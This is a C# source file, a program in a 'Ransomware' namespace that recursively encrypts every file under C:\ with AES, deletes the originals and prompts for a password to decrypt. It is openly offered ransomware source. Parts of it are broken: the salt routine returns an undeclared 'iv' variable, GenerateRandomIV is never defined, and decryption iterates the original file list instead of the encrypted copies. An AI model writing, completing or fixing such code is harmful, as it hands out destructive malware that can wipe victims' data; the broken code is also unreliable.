using System;
using System.IO;
using System.Security.Cryptography;

namespace Ransomware
{
    class Program
    {
        static void Main(string[] args)
        {
            string directory = @"C:\";
            string[] files = Directory.GetFiles(directory, "*", SearchOption.AllDirectories);

            string password = GetPasswordFromUser();

            foreach (string file in files)
            {
                EncryptFile(file, password);
            }

            Console.WriteLine("All files have been encrypted.");
            Console.ReadLine();

            bool passwordMatched = false;
            while (!passwordMatched)
            {
                password = GetPasswordFromUser();

                foreach (string file in files)
                {
                    if (DecryptFile(file, password))
                    {
                        passwordMatched = true;
                    }
                }

                if (!passwordMatched)
                {
                    Console.WriteLine("Incorrect password. Please try again.");
                }
            }

            Console.WriteLine("All files have been decrypted.");
            Console.ReadLine();
        }

        static string GetPasswordFromUser()
        {
            Console.Write("Enter the password: ");
            return Console.ReadLine();
        }

        static void EncryptFile(string inputFile, string password)
        {
            byte[] salt = GenerateRandomSalt();

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);
            byte[] ivBytes = GenerateRandomIV();

            using (FileStream inputStream = File.OpenRead(inputFile))
            {
                using (FileStream outputStream = File.Create(inputFile + ".encrypted"))
                {
                    outputStream.Write(salt, 0, salt.Length);
                    outputStream.Write(ivBytes, 0, ivBytes.Length);

                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.Key = keyBytes;
                        aes.IV = ivBytes;
                        aes.Mode = CipherMode.CBC;

                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }

            File.Delete(inputFile);
        }

        static bool DecryptFile(string inputFile, string password)
        {
            if (!inputFile.EndsWith(".encrypted"))
            {
                return false;
            }

            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[16];
            byte[] iv = new byte[16];
            byte[] fileBytes = File.ReadAllBytes(inputFile);

            Buffer.BlockCopy(fileBytes, 0, salt, 0, salt.Length);
            Buffer.BlockCopy(fileBytes, salt.Length, iv, 0, iv.Length);
            byte[] encrypted = new byte[fileBytes.Length - salt.Length - iv.Length];

            Buffer.BlockCopy(fileBytes, salt.Length + iv.Length, encrypted, 0, encrypted.Length);

            byte[] keyBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000).GetBytes(256 / 8);

            try
            {
                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.Key = keyBytes;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;

                    
                    using (FileStream outputStream = File.Create(inputFile.Replace(".encrypted", "")))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(encrypted, 0, encrypted.Length);
                        }
                    }
                }

                File.Delete(inputFile);
                return true;
            }
            catch (CryptographicException)
            {
                return false;
            }
        }

        static byte[] GenerateRandomSalt()
        {
            byte[] salt = new byte[16];
            using (RNGCryptoServiceProvider rngCsp = new RNGCryptoServiceProvider())
             {
                rngCsp.GetBytes(iv);
            }
            return iv;
        }
    }
}
